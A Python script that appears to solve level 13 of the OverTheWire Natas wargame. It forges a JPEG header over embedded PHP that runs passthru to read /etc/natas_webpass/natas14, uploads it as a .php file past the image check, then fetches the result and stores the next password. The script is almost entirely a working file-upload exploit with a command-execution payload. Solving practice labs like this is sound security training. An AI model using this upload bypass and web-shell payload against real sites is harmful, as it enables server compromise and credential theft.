import requests
import re
from natas_utility import *
import html

current_level = 13
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url

with open('1.jpg', mode='wb') as file:
    file.write(b'''\xff\xd8\xff
<?
passthru('cat /etc/natas_webpass/natas14');
?>
''')

data = {'filename': '...php',
        'MAX_FILE_SIZE': '1000',
        'submit': 'submit'}
files = {'uploadedfile': ('...jpg', open('1.jpg', 'rb'))}
response = session.post(url, data=data, files=files, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
cookies = response.cookies

# print(content)

php_url_regex = re.compile(r'<a href="(.+)">upload')
php_url = '{}/{}'.format(base_url, php_url_regex.findall(content)[0])

response = session.get(php_url, auth=auth)
password = response.content[3:].decode('utf-8')
# print(cookies['data'])

password_regex = re.compile(r'(.+)\n')
next_password = password_regex.findall(password)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
